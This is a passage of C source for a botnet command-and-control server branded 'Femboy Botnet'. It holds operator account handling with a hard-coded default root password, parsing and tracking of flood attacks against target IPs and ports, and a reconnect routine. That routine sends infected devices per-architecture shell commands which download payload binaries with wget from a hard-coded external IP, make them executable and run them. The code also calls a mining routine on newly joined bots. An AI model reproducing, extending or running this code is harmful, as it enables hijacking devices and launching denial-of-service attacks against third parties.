                    users[i].cooldown, users[i].vip, users[i].max_sessions,
                    users[i].max_attacks, users[i].admin);
        }
        fclose(file);
    }
}

int kick_bots_by_arch(const char* arch) {
    pthread_mutex_lock(&bot_mutex);
    
    int kicked_count = 0;
    for (int i = 0; i < MAX_BOTS; i++) {
        if (connected_bots[i] != NULL && connected_bots[i]->is_bot && 
            connected_bots[i]->active && strcmp(connected_bots[i]->architecture, arch) == 0) {
            
            printf("Kicking bot with blacklisted architecture %s: %s\n", arch, connected_bots[i]->ip);
            
            close(connected_bots[i]->socket);
            free(connected_bots[i]);
            connected_bots[i] = NULL;
            bot_count--;
            kicked_count++;
        }
    }
    
    pthread_mutex_unlock(&bot_mutex);
    
    return kicked_count;
}

void add_user_command(int client_sock) {
    char buffer[BUFFER_SIZE];
    User new_user;
    
    send(client_sock, "Username: ", 10, 0);
    int bytes_received = recv(client_sock, buffer, BUFFER_SIZE - 1, 0);
    if (bytes_received <= 0) return;
    buffer[bytes_received] = '\0';
    char* newline = strchr(buffer, '\r');
    if (newline) *newline = '\0';
    newline = strchr(buffer, '\n');
    if (newline) *newline = '\0';
    strncpy(new_user.username, buffer, sizeof(new_user.username) - 1);
    
    send(client_sock, "Password: ", 10, 0);
    bytes_received = recv(client_sock, buffer, BUFFER_SIZE - 1, 0);
    if (bytes_received <= 0) return;
    buffer[bytes_received] = '\0';
    newline = strchr(buffer, '\r');
    if (newline) *newline = '\0';
    newline = strchr(buffer, '\n');
    if (newline) *newline = '\0';
    strncpy(new_user.password, buffer, sizeof(new_user.password) - 1);
    
    strcpy(new_user.expiry, "lifetime");
    new_user.cooldown = 0;
    
    send(client_sock, "Vip (y/n): ", 11, 0);
    bytes_received = recv(client_sock, buffer, BUFFER_SIZE - 1, 0);
    if (bytes_received <= 0) return;
    buffer[bytes_received] = '\0';
    newline = strchr(buffer, '\r');
    if (newline) *newline = '\0';
    newline = strchr(buffer, '\n');
    if (newline) *newline = '\0';
    new_user.vip = (buffer[0] == 'y' || buffer[0] == 'Y') ? 1 : 0;
    
    new_user.max_sessions = 1;
    new_user.max_attacks = 10;
    
    send(client_sock, "Admin (y/n): ", 13, 0);
    bytes_received = recv(client_sock, buffer, BUFFER_SIZE - 1, 0);
    if (bytes_received <= 0) return;
    buffer[bytes_received] = '\0';
    newline = strchr(buffer, '\r');
    if (newline) *newline = '\0';
    newline = strchr(buffer, '\n');
    if (newline) *newline = '\0';
    new_user.admin = (buffer[0] == 'y' || buffer[0] == 'Y') ? 1 : 0;
    
    if (user_count < 100) {
        users[user_count++] = new_user;
        
        FILE* file = fopen("user.txt", "a");
        if (file) {
            fprintf(file, "%s:%s:%s:%d:%d:%d:%d:%d\n",
                    new_user.username, new_user.password, new_user.expiry,
                    new_user.cooldown, new_user.vip, new_user.max_sessions,
                    new_user.max_attacks, new_user.admin);
            fclose(file);
        }
        
        char success_msg[256];
        sprintf(success_msg, "User %s added successfully!\r\n", new_user.username);
        send(client_sock, success_msg, strlen(success_msg), MSG_NOSIGNAL);
    } else {
        send(client_sock, "User database full!\r\n", 21, MSG_NOSIGNAL);
    }
}

void load_database() {
    FILE* file = fopen("user.txt", "r");
    if (!file) {
        file = fopen("user.txt", "w");
        if (file) {
            fprintf(file, "root:313nmaahh84real:lifetime:0:1:5:10:1\n");
            fclose(file);
        }
        file = fopen("user.txt", "r");
        if (!file) return;
    }
    
    char line[256];
    user_count = 0;
    
    while (fgets(line, sizeof(line), file) && user_count < 100) {
        line[strcspn(line, "\r\n")] = 0;
        
        if (line[0] == '#' || strlen(line) == 0) continue;
        
        char* tokens[8];
        char* token = strtok(line, ":");
        int i = 0;
        
        while (token && i < 8) {
            tokens[i++] = token;
            token = strtok(NULL, ":");
        }
        
        if (i == 8) {
            strcpy(users[user_count].username, tokens[0]);
            strcpy(users[user_count].password, tokens[1]);
            strcpy(users[user_count].expiry, tokens[2]);
            users[user_count].cooldown = atoi(tokens[3]);
            users[user_count].vip = atoi(tokens[4]);
            users[user_count].max_sessions = atoi(tokens[5]);
            users[user_count].max_attacks = atoi(tokens[6]);
            users[user_count].admin = atoi(tokens[7]);
            user_count++;
        }
    }
    
    fclose(file);
}

User* find_user(const char* username, const char* password) {
    for (int i = 0; i < user_count; i++) {
        if (strcmp(users[i].username, username) == 0 && 
            strcmp(users[i].password, password) == 0) {
            return &users[i];
        }
    }
    return NULL;
}

int check_expiry(const char* expiry) {
    if (strcmp(expiry, "lifetime") == 0) return 1;
    
    time_t now = time(NULL);
    struct tm expiry_tm = {0};
    sscanf(expiry, "%d-%d-%d", &expiry_tm.tm_year, &expiry_tm.tm_mon, &expiry_tm.tm_mday);
    expiry_tm.tm_year -= 1900;
    expiry_tm.tm_mon -= 1;
    
    time_t expiry_time = mktime(&expiry_tm);
    return now <= expiry_time;
}

void update_title(ClientSession* session) {
    char title[512];
    
    if (session->is_bot) {
        sprintf(title, "\033]0;Femboy Botnet - Bots: %d\007", bot_count);
        send(session->socket, title, strlen(title), 0);
        return;
    }
    
    FILE* file = fopen("branding/title.tfx", "r");
    if (!file) {
        sprintf(title, "\033]0;Femboy Botnet - User: %s - Expiry: %s - Ongoing: %d/%d - Bots: %d - Online: %d\007", 
                session->username, session->user_info->expiry, 
                session->current_attacks, session->max_attacks, bot_count, online_users);
        send(session->socket, title, strlen(title), 0);
        return;
    }
    
    char line[BUFFER_SIZE];
    if (fgets(line, sizeof(line), file)) {
        line[strcspn(line, "\r\n")] = 0;
        
        char output[256] = "";
        char* pos = line;
        
        while (*pos) {
            if (*pos == '{') {
                char* end = strchr(pos, '}');
                if (end) {
                    char tag[64];
                    int tag_len = end - pos - 1;
                    strncpy(tag, pos + 1, tag_len);
                    tag[tag_len] = '\0';
                    
                    if (strcmp(tag, "username") == 0) {
                        strcat(output, session->username);
                    } else if (strcmp(tag, "expiry") == 0) {
                        strcat(output, session->user_info->expiry);
                    } else if (strcmp(tag, "ongoing") == 0) {
                        char buf[16];
                        sprintf(buf, "%d", session->current_attacks);
                        strcat(output, buf);
                    } else if (strcmp(tag, "max") == 0) {
                        char buf[16];
                        sprintf(buf, "%d", session->max_attacks);
                        strcat(output, buf);
                    } else if (strcmp(tag, "bots") == 0) {
                        char buf[16];
                        sprintf(buf, "%d", bot_count);
                        strcat(output, buf);
                    } else if (strcmp(tag, "online") == 0) {
                        char buf[16];
                        pthread_mutex_lock(&online_mutex);
                        sprintf(buf, "%d", online_users);
                        pthread_mutex_unlock(&online_mutex);
                        strcat(output, buf);
                    } else {
                        strncat(output, pos, end - pos + 1);
                    }
                    pos = end + 1;
                } else {
                    strncat(output, pos, 1);
                    pos++;
                }
            } else {
                strncat(output, pos, 1);
                pos++;
            }
        }
        
        sprintf(title, "\033]0;%s\007", output);
        send(session->socket, title, strlen(title), 0);
    }
    
    fclose(file);
}

void* title_updater(void* param) {
    ClientSession* session = (ClientSession*)param;
    
    while (session->active && session->authenticated) {
        update_title(session);
        sleep(1);
    }
    
    return NULL;
}

int is_duplicate_bot(const char* ip) {
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < MAX_BOTS; i++) {
        if (connected_bots[i] != NULL && connected_bots[i]->active && 
            connected_bots[i]->is_bot && strcmp(connected_bots[i]->ip, ip) == 0) {
            pthread_mutex_unlock(&bot_mutex);
            return 1;
        }
    }
    pthread_mutex_unlock(&bot_mutex);
    return 0;
}

void send_to_bots_count(char* command, int bot_count_to_send) {
    pthread_mutex_lock(&bot_mutex);
    
    char full_command[BUFFER_SIZE];
    sprintf(full_command, "%s\r\n", command);
    
    int sent_count = 0;
    for (int i = 0; i < MAX_BOTS; i++) {
        if (connected_bots[i] != NULL && connected_bots[i]->is_bot && connected_bots[i]->active) {
            int result = send(connected_bots[i]->socket, full_command, strlen(full_command), MSG_NOSIGNAL);
            if (result > 0) {
                sent_count++;
            }
            
            if (bot_count_to_send != -1 && sent_count >= bot_count_to_send) {
                break;
            }
        }
    }
    
    pthread_mutex_unlock(&bot_mutex);
}

void send_stop_to_bots() {
    pthread_mutex_lock(&bot_mutex);
    
    char stop_command[] = "stop\r\n";
    
    for (int i = 0; i < MAX_BOTS; i++) {
        if (connected_bots[i] != NULL && connected_bots[i]->is_bot && connected_bots[i]->active) {
            send(connected_bots[i]->socket, stop_command, strlen(stop_command), MSG_NOSIGNAL);
        }
    }
    
    pthread_mutex_unlock(&bot_mutex);
}

void stop_all_ongoing_attacks() {
    pthread_mutex_lock(&attack_mutex);
    
    for (int i = 0; i < ongoing_count; i++) {
        if (ongoing_attacks[i].active) {
            ongoing_attacks[i].owner->current_attacks--;
            ongoing_attacks[i].active = 0;
        }
    }
    ongoing_count = 0;
    
    pthread_mutex_unlock(&attack_mutex);
}

void reconnect_bots() {
    pthread_mutex_lock(&bot_mutex);
    
    char arm7_command[] = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://154.6.197.35:6677/bins/arm7; chmod 777 arm7; ./arm7\r\n";
    char arm5_command[] = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://154.6.197.35:6677/bins/arm5; chmod 777 arm5; ./arm5\r\n";
    char arm4_command[] = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://154.6.197.35:6677/bins/arm4; chmod 777 arm4; ./arm4\r\n";
    char arm6_command[] = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://154.6.197.35:6677/bins/arm6; chmod 777 arm6; ./arm6\r\n";
    char mips_command[] = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://154.6.197.35:6677/bins/mips; chmod 777 mips; ./mips\r\n";
    char mipsel_command[] = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://154.6.197.35:6677/bins/mipsel; chmod 777 mipsel; ./mipsel\r\n";
    char sh4_command[] = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://154.6.197.35:6677/bins/sh4; chmod 777 sh4; ./sh4\r\n";
    char ppc_command[] = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://154.6.197.35:6677/bins/ppc; chmod 777 ppc; ./ppc\r\n";
    char m68k_command[] = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://154.6.197.35:6677/bins/m68k; chmod 777 m68k; ./m68k\r\n";
    char default_command[] = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://154.6.197.35:6677/bins/arm7; chmod 777 arm7; ./arm7\r\n";
    
    for (int i = 0; i < MAX_BOTS; i++) {
        if (connected_bots[i] != NULL && connected_bots[i]->is_bot && connected_bots[i]->active) {
            char* command_to_send = default_command;
            
            if (!check_blacklist_x86_downloads(connected_bots[i]->ip, command_to_send)) {
                connected_bots[i]->active = 0;
                close(connected_bots[i]->socket);
                bot_count--;
                continue;
            }

            if (strcmp(connected_bots[i]->architecture, "arm7") == 0) {
                command_to_send = arm7_command;
            } else if (strcmp(connected_bots[i]->architecture, "arm5") == 0) {
                command_to_send = arm5_command;
            } else if (strcmp(connected_bots[i]->architecture, "arm4") == 0) {
                command_to_send = arm4_command;
            } else if (strcmp(connected_bots[i]->architecture, "arm6") == 0) {
                command_to_send = arm6_command;
            } else if (strcmp(connected_bots[i]->architecture, "mips") == 0) {
                command_to_send = mips_command;
            } else if (strcmp(connected_bots[i]->architecture, "mipsel") == 0) {
                command_to_send = mipsel_command;
            } else if (strcmp(connected_bots[i]->architecture, "sh4") == 0) {
                command_to_send = sh4_command;
            } else if (strcmp(connected_bots[i]->architecture, "ppc") == 0) {
                command_to_send = ppc_command;
            } else if (strcmp(connected_bots[i]->architecture, "m68k") == 0) {
                command_to_send = m68k_command;
            }
            
            ssize_t bytes_sent = send(connected_bots[i]->socket, command_to_send, strlen(command_to_send), MSG_NOSIGNAL);
            if (bytes_sent == -1) {
                perror("send failed");
                connected_bots[i]->active = 0;
            } else {
                printf("Sent %s reconnect command to bot %s\n", 
                       connected_bots[i]->architecture, connected_bots[i]->ip);
            }
        }
    }
    
    pthread_mutex_unlock(&bot_mutex);
}

void cleanup_bot(ClientSession* session) {
    if (session == NULL) return;
    
    pthread_mutex_lock(&bot_mutex);
    
    if (session->is_bot && session->active) {
        for (int i = 0; i < MAX_BOTS; i++) {
            if (connected_bots[i] == session) {
                connected_bots[i] = NULL;
                bot_count--;
                break;
            }
        }
    }
    
    pthread_mutex_unlock(&bot_mutex);
    
    close(session->socket);
    free(session);
}

void add_bot(ClientSession* session) {
    pthread_mutex_lock(&bot_mutex);
    
    for (int i = 0; i < MAX_BOTS; i++) {
        if (connected_bots[i] == NULL) {
            connected_bots[i] = session;
            session->active = 1;
            bot_count++;
            break;
        }
    }
    
    pthread_mutex_unlock(&bot_mutex);
}

void send_methods(int client_sock) {
    send_tfx_file(client_sock, "branding/methods.tfx", NULL, NULL, 0, 0, 0, 0, 0, 0, 0);
}

void send_help(int client_sock) {
    send_tfx_file(client_sock, "branding/help.tfx", NULL, NULL, 0, 0, 0, 0, 0, 0, 0);
}

void send_bots_info(int client_sock) {
    pthread_mutex_lock(&bot_mutex);
    
    int x86_32_count = 0;
    int x86_64_count = 0;
    int mips_count = 0;
    int mipsel_count = 0;
    int arm7_count = 0;
    int sh4_count = 0;
    int arm6_count = 0;
    int ppc_count = 0;
    int i586_count = 0;
    int m68k_count = 0;
    int arm4_count = 0;
    int arm5_count = 0;
    int arm_count = 0;
    int unknown_count = 0;
    
    for (int i = 0; i < MAX_BOTS; i++) {
        if (connected_bots[i] != NULL && connected_bots[i]->is_bot && connected_bots[i]->active) {
            char* arch = connected_bots[i]->architecture;
            
            if (strcmp(arch, "x86") == 0) x86_32_count++;
            else if (strcmp(arch, "x32") == 0) x86_32_count++;
            else if (strcmp(arch, "x86_32") == 0) x86_32_count++;
            else if (strcmp(arch, "x86_64") == 0) x86_64_count++;
            else if (strcmp(arch, "mips") == 0) mips_count++;
            else if (strcmp(arch, "mipsel") == 0) mipsel_count++;
            else if (strcmp(arch, "arm7") == 0) arm7_count++;
            else if (strcmp(arch, "sh4") == 0) sh4_count++;
            else if (strcmp(arch, "arm6") == 0) arm6_count++;
            else if (strcmp(arch, "ppc") == 0) ppc_count++;
            else if (strcmp(arch, "i586") == 0) i586_count++;
            else if (strcmp(arch, "m68k") == 0) m68k_count++;
            else if (strcmp(arch, "arm4") == 0) arm4_count++;
            else if (strcmp(arch, "arm5") == 0) arm5_count++;
            else if (strcmp(arch, "arm") == 0) arm_count++; 
            else unknown_count++;
        }
    }
    
    int total_bots = x86_32_count + x86_64_count + mips_count + mipsel_count + arm7_count + 
                    sh4_count + arm6_count + ppc_count + i586_count + m68k_count + 
                    arm4_count + arm5_count + arm_count + unknown_count;
    
    char bot_msg[256];
    
    sprintf(bot_msg, "\033[97mx86_32: \033[36m%d\033[0m\r\n", x86_32_count);
    send(client_sock, bot_msg, strlen(bot_msg), MSG_NOSIGNAL);
    
    sprintf(bot_msg, "\033[97mx86_64: \033[36m%d\033[0m\r\n", x86_64_count);
    send(client_sock, bot_msg, strlen(bot_msg), MSG_NOSIGNAL);
    
    sprintf(bot_msg, "\033[97mmips: \033[36m%d\033[0m\r\n", mips_count);
    send(client_sock, bot_msg, strlen(bot_msg), MSG_NOSIGNAL);

    sprintf(bot_msg, "\033[97mmipsel: \033[36m%d\033[0m\r\n", mipsel_count);
    send(client_sock, bot_msg, strlen(bot_msg), MSG_NOSIGNAL);

    sprintf(bot_msg, "\033[97marm7: \033[36m%d\033[0m\r\n", arm7_count);
    send(client_sock, bot_msg, strlen(bot_msg), MSG_NOSIGNAL);

    sprintf(bot_msg, "\033[97msh4: \033[36m%d\033[0m\r\n", sh4_count);
    send(client_sock, bot_msg, strlen(bot_msg), MSG_NOSIGNAL);

    sprintf(bot_msg, "\033[97marm6: \033[36m%d\033[0m\r\n", arm6_count);
    send(client_sock, bot_msg, strlen(bot_msg), MSG_NOSIGNAL);

    sprintf(bot_msg, "\033[97mppc: \033[36m%d\033[0m\r\n", ppc_count);
    send(client_sock, bot_msg, strlen(bot_msg), MSG_NOSIGNAL);

    sprintf(bot_msg, "\033[97mi586: \033[36m%d\033[0m\r\n", i586_count);
    send(client_sock, bot_msg, strlen(bot_msg), MSG_NOSIGNAL);

    sprintf(bot_msg, "\033[97mm68k: \033[36m%d\033[0m\r\n", m68k_count);
    send(client_sock, bot_msg, strlen(bot_msg), MSG_NOSIGNAL);

    sprintf(bot_msg, "\033[97marm4: \033[36m%d\033[0m\r\n", arm4_count);
    send(client_sock, bot_msg, strlen(bot_msg), MSG_NOSIGNAL);

    sprintf(bot_msg, "\033[97marm5: \033[36m%d\033[0m\r\n", arm5_count);
    send(client_sock, bot_msg, strlen(bot_msg), MSG_NOSIGNAL);

    sprintf(bot_msg, "\033[97marm: \033[36m%d\033[0m\r\n", arm_count);
    send(client_sock, bot_msg, strlen(bot_msg), MSG_NOSIGNAL);
    
    sprintf(bot_msg, "\033[97mUnknown: \033[36m%d\033[0m\r\n", unknown_count);
    send(client_sock, bot_msg, strlen(bot_msg), MSG_NOSIGNAL);
    
    sprintf(bot_msg, "\033[97mTotal botcount: \033[36m%d\033[0m\r\n", total_bots);
    send(client_sock, bot_msg, strlen(bot_msg), MSG_NOSIGNAL);
    
    pthread_mutex_unlock(&bot_mutex);
}

void cleanup_expired_attacks() {
    pthread_mutex_lock(&attack_mutex);
    
    time_t now = time(NULL);
    int i = 0;
    while (i < ongoing_count) {
        if (ongoing_attacks[i].active && 
            (now - ongoing_attacks[i].start_time) >= ongoing_attacks[i].duration_seconds) {
            
            ongoing_attacks[i].owner->current_attacks--;
            ongoing_attacks[i].active = 0;
            
            for (int j = i; j < ongoing_count - 1; j++) {
                ongoing_attacks[j] = ongoing_attacks[j + 1];
            }
            ongoing_count--;
        } else {
            i++;
        }
    }
    
    pthread_mutex_unlock(&attack_mutex);
}

void send_ongoing_attacks(int client_sock) {
    cleanup_expired_attacks();
    
    pthread_mutex_lock(&attack_mutex);
    
    char attack_msg[256];
    sprintf(attack_msg, "Ongoing Attacks: %d\r\n", ongoing_count);
    send(client_sock, attack_msg, strlen(attack_msg), MSG_NOSIGNAL);
    
    if (ongoing_count == 0) {
        send(client_sock, "No active attacks\r\n", 19, MSG_NOSIGNAL);
    } else {
        for (int i = 0; i < ongoing_count; i++) {
            if (ongoing_attacks[i].active) {
                time_t elapsed = time(NULL) - ongoing_attacks[i].start_time;
                time_t remaining = ongoing_attacks[i].duration_seconds - elapsed;
                
                sprintf(attack_msg, "Attack %d: %s %s:%s for %lds more (Method: %s, Bots: %d)\r\n", 
                        i+1, ongoing_attacks[i].method, ongoing_attacks[i].ip, 
                        ongoing_attacks[i].port, remaining,
                        ongoing_attacks[i].method, ongoing_attacks[i].bot_count);
                send(client_sock, attack_msg, strlen(attack_msg), MSG_NOSIGNAL);
            }
        }
    }
    
    pthread_mutex_unlock(&attack_mutex);
}

void add_ongoing_attack(const char* method, const char* ip, const char* port, const char* duration, int packet_size, int bot_count, ClientSession* owner) {
    pthread_mutex_lock(&attack_mutex);
    
    if (ongoing_count < 100) {
        strcpy(ongoing_attacks[ongoing_count].method, method);
        strcpy(ongoing_attacks[ongoing_count].ip, ip);
        strcpy(ongoing_attacks[ongoing_count].port, port);
        strcpy(ongoing_attacks[ongoing_count].duration, duration);
        ongoing_attacks[ongoing_count].packet_size = packet_size;
        ongoing_attacks[ongoing_count].bot_count = bot_count;
        ongoing_attacks[ongoing_count].start_time = time(NULL);
        ongoing_attacks[ongoing_count].duration_seconds = atoi(duration);
        ongoing_attacks[ongoing_count].owner = owner;
        ongoing_attacks[ongoing_count].active = 1;
        ongoing_count++;
        
        owner->current_attacks++;
    }
    
    pthread_mutex_unlock(&attack_mutex);
}

void remove_ongoing_attack(int index) {
    pthread_mutex_lock(&attack_mutex);
    
    if (index >= 0 && index < ongoing_count) {
        ongoing_attacks[index].owner->current_attacks--;
        ongoing_attacks[index].active = 0;
        
        for (int i = index; i < ongoing_count - 1; i++) {
            ongoing_attacks[i] = ongoing_attacks[i + 1];
        }
        ongoing_count--;
    }
    
    pthread_mutex_unlock(&attack_mutex);
}

void force_cleanup_attacks() {
    pthread_mutex_lock(&attack_mutex);
    
    int i = 0;
    while (i < ongoing_count) {
        if (ongoing_attacks[i].active && 
            (time(NULL) - ongoing_attacks[i].start_time) >= ongoing_attacks[i].duration_seconds) {
            
            if (ongoing_attacks[i].owner != NULL) {
                if (ongoing_attacks[i].owner->user_info) {
                    ongoing_attacks[i].owner->current_attacks--;
                }
                free(ongoing_attacks[i].owner);
            }
            
            for (int j = i; j < ongoing_count - 1; j++) {
                ongoing_attacks[j] = ongoing_attacks[j + 1];
            }
            ongoing_count--;
        } else {
            i++;
        }
    }
    
    pthread_mutex_unlock(&attack_mutex);
}
int authenticate_bot(ClientSession* session) {
    if (is_ip_whitelisted(session->ip)) {
        printf("Whitelisted bot connected from %s\n", session->ip);
    }

    if (strstr(session->architecture, "x86") || strstr(session->architecture, "x86_32") || strstr(session->architecture, "x86_64")) {
        printf("x86 architecture detected from IP: %s, automatically blacklisting\n", session->ip);
        add_to_blacklist(session->ip);
        char blacklist_msg[] = "x86 architecture not allowed!\r\n";
        send(session->socket, blacklist_msg, strlen(blacklist_msg), MSG_NOSIGNAL);
        close(session->socket);
        free(session);
        return 0;
    }

    if (is_arch_blacklisted(session->architecture)) {
        printf("Blacklisted architecture %s detected from IP: %s\n", session->architecture, session->ip);
        char blacklist_msg[128];
        sprintf(blacklist_msg, "Architecture %s is blacklisted!\r\n", session->architecture);
        send(session->socket, blacklist_msg, strlen(blacklist_msg), MSG_NOSIGNAL);
        close(session->socket);
        free(session);
        return 0;
    }

    if (is_ip_blacklisted(session->ip)) {
        printf("Blacklisted bot detected from IP: %s\n", session->ip);
        char blacklist_msg[] = "Blacklisted IP!\r\n";
        send(session->socket, blacklist_msg, strlen(blacklist_msg), MSG_NOSIGNAL);
        close(session->socket);
        free(session);
        return 0;
    }
    
    if (DUPLICATE_BOT_DETECTION && is_duplicate_bot(session->ip)) {
        printf("Duplicate bot detected from IP: %s\n", session->ip);
        char duplicate_msg[] = "Duplicate bot detected! Connection rejected.\r\n";
        send(session->socket, duplicate_msg, strlen(duplicate_msg), MSG_NOSIGNAL);
        
        FILE* log_file = fopen("logs/duplicates.txt", "a");
        if (log_file) {
            time_t now = time(NULL);
            struct tm* tm_info = localtime(&now);
            fprintf(log_file, "%04d-%02d-%02d %02d:%02d:%02d | DUPLICATE | IP: %s | Arch: %s | Platform: %s | Device: %s\n",
                    tm_info->tm_year + 1900, tm_info->tm_mon + 1, tm_info->tm_mday,
                    tm_info->tm_hour, tm_info->tm_min, tm_info->tm_sec,
                    session->ip, session->architecture, session->platform, session->device_type);
            fclose(log_file);
        }
        
        close(session->socket);
        free(session);
        return 0;
    }
    
    session->authenticated = 1;
    session->is_bot = 1;
    strcpy(session->username, "bot");
    session->vip = 0;
    session->admin = 0;
    session->max_attacks = 0;
    session->current_attacks = 0;
    session->user_info = find_user("bot", "bot");
    add_bot(session);
    
    apply_mining_to_new_bot(session);
    
    printf("Bot connected from %s [%s/%s/%s]%s\n", 
           session->ip, session->architecture, session->platform, session->device_type,
           is_ip_whitelisted(session->ip) ? " (Whitelisted)" : "");
    
    send(session->socket, "Bot registered successfully!\r\n", 30, 0);
    return 1;
}

void clear_input_buffer(int sock) {
    struct timeval tv;
    tv.tv_sec = 0;
    tv.tv_usec = 10000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    
    char buffer[BUFFER_SIZE];
    while (recv(sock, buffer, BUFFER_SIZE - 1, 0) > 0) {
       
    }
    tv.tv_sec = 0;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
}
int authenticate_client(ClientSession* session) {
    int client_sock = session->socket;
    char auth_buffer[BUFFER_SIZE];
    int bytes_received;

    clear_input_buffer(client_sock);
    
    send(client_sock, "\033[36mUsername\033[37m: \033[0m", 20, 0);
    
    bytes_received = recv(client_sock, auth_buffer, BUFFER_SIZE - 1, 0);
    if (bytes_received <= 0) return 0;

    auth_buffer[bytes_received] = '\0';
    char* newline = strchr(auth_buffer, '\r');
    if (newline) *newline = '\0';
    newline = strchr(auth_buffer, '\n');
    if (newline) *newline = '\0';

    char username[BUFFER_SIZE];
    strncpy(username, auth_buffer, sizeof(username) - 1);
    username[sizeof(username) - 1] = '\0';

    if (strcmp(username, "bot") == 0) {
        send(client_sock, "Use bot port 6678 for bot connections!\r\n", 39, 0);
        return 0;
    }

    clear_input_buffer(client_sock);
    
    send(client_sock, "\033[36mPassword\033[37m: \033[0m", 20, 0);

    char password[BUFFER_SIZE];
    memset(password, 0, sizeof(password));
    
    bytes_received = recv(client_sock, password, BUFFER_SIZE - 1, 0);
    if (bytes_received <= 0) return 0;

    password[bytes_received] = '\0';
    newline = strchr(password, '\r');
    if (newline) *newline = '\0';
    newline = strchr(password, '\n');
    if (newline) *newline = '\0';

    send(client_sock, "\r\n", 2, MSG_NOSIGNAL);

    const char spinBuf[] = {'-', '\\', '|', '/'};
    char loading_msg[64];
    for (int i = 0; i < 15; i++) {
        snprintf(loading_msg, sizeof(loading_msg), "\r\033[36mLoading... \033[37m%c\033[0m", spinBuf[i % 4]);
        send(client_sock, loading_msg, strlen(loading_msg), MSG_NOSIGNAL);
        usleep(100000);
    }

    send(client_sock, "\r\n", 2, MSG_NOSIGNAL);

    User* user = find_user(username, password);
    if (user && check_expiry(user->expiry)) {
        strcpy(session->username, username);
        session->authenticated = 1;
        session->vip = user->vip;
        session->admin = user->admin;
        session->max_attacks = user->max_attacks;
        session->current_attacks = 0;
        session->last_attack = 0;
        session->user_info = user;

        send(client_sock, "\033[2J\033[H", 8, MSG_NOSIGNAL);
        send_main(client_sock, session);

        log_login(username, password, "success", session->ip);
        return 1;
    }

    log_login(username, password, "failed", session->ip);
    send(client_sock, "\r\n\033[31mInvalid credentials or account expired!\033[0m\r\n", 49, MSG_NOSIGNAL);
    return 0;
}
void parse_attack_command(char* command, char* method, char* ip, char* time_val, char* port, 
                         int* bot_count, int* packet_size, int* pps_rate, int* connections) {
    strcpy(method, "");
    strcpy(ip, "");
    strcpy(time_val, "");
    strcpy(port, "");
    *bot_count = -1;
    *packet_size = 1400;
    *pps_rate = 10000;
    *connections = 1000;
    
    char command_copy[BUFFER_SIZE];
    strcpy(command_copy, command);
    
    char* token = strtok(command_copy, " ");
    if (token) strcpy(method, token);
    
    token = strtok(NULL, " ");
    if (token) strcpy(ip, token);
    
    token = strtok(NULL, " ");
    if (token) strcpy(time_val, token);
    
    token = strtok(NULL, " ");
    while (token != NULL) {
        if (strstr(token, "dport=") == token) {
            strcpy(port, token + 6);
        } else if (strstr(token, "bots=") == token) {
            *bot_count = atoi(token + 5);
        } else if (strstr(token, "len=") == token) {
            *packet_size = atoi(token + 4);
        } else if (strstr(token, "pps=") == token) {
            *pps_rate = atoi(token + 4);
        } else if (strstr(token, "connections=") == token) {
            *connections = atoi(token + 12);
        }
        token = strtok(NULL, " ");
    }
}

int can_launch_attack(ClientSession* session) {
    force_cleanup_attacks();
    
    if (session->current_attacks >= session->max_attacks) {
        return 0;
    }
    
    time_t now = time(NULL);
    if (session->user_info->cooldown > 0 && (now - session->last_attack) < session->user_info->cooldown) {
        return -1;
    }
    
    return 1;
}

void add_to_blacklist(const char* ip) {
    if (!ip || strlen(ip) == 0) return;

    printf("DEBUG: Adding IP %s to blacklist\n", ip);

    struct stat st = {0};
    if (stat("blacklist", &st) == -1) {
        mkdir("blacklist", 0700);
    }

    if (is_ip_blacklisted(ip)) {
        printf("DEBUG: IP %s already in blacklist\n", ip);
        return;
    }

    FILE* file = fopen("blacklist/bot.txt", "a");
    if (file) {
        fprintf(file, "%s\n", ip);
        fclose(file);
        printf("DEBUG: Successfully wrote IP %s to blacklist file\n", ip);
    } else {
        printf("DEBUG: FAILED to open blacklist file for writing\n");
    }

    FILE* log = fopen("logs/blacklist.log", "a");
    if (log) {
        time_t now = time(NULL);
        struct tm* tm_info = localtime(&now);
        fprintf(log, "%04d-%02d-%02d %02d:%02d:%02d | BLACKLISTED | %s\n",
                tm_info->tm_year + 1900, tm_info->tm_mon + 1, tm_info->tm_mday,
                tm_info->tm_hour, tm_info->tm_min, tm_info->tm_sec,
                ip);
        fclose(log);
    }
}
void remove_from_blacklist(const char* ip) {
    FILE* file = fopen("blacklist/bot.txt", "r");
    if (!file) return;
    
    char lines[1000][64];
    int count = 0;
    char line[64];
    
    while (fgets(line, sizeof(line), file) && count < 1000) {
        line[strcspn(line, "\r\n")] = '\0';
        if (strlen(line) > 0 && strcmp(line, ip) != 0) {
            strcpy(lines[count++], line);
        }
    }
    fclose(file);
    
    file = fopen("blacklist/bot.txt", "w");
    if (file) {
        for (int i = 0; i < count; i++) {
            fprintf(file, "%s\n", lines[i]);
        }
        fclose(file);
    }
}

void list_blacklist(int client_sock) {
    FILE* file = fopen("blacklist/bot.txt", "r");
    if (!file) {
        send(client_sock, "Blacklist is empty or doesn't exist.\r\n", 38, MSG_NOSIGNAL);
        return;
    }
    
    send(client_sock, "Blacklisted IPs:\r\n", 18, MSG_NOSIGNAL);
    send(client_sock, "----------------\r\n", 18, MSG_NOSIGNAL);
    
    char line[64];
    int count = 0;
    while (fgets(line, sizeof(line), file)) {
        line[strcspn(line, "\r\n")] = '\0';
        if (strlen(line) > 0 && line[0] != '#') {
            char output[128];
            sprintf(output, "%d. %s\r\n", ++count, line);
            send(client_sock, output, strlen(output), MSG_NOSIGNAL);
        }
    }
    
    if (count == 0) {
        send(client_sock, "No blacklisted IPs found.\r\n", 27, MSG_NOSIGNAL);
    }
    
    fclose(file);
}

void handle_bot_system_info(ClientSession* session, char* info) {
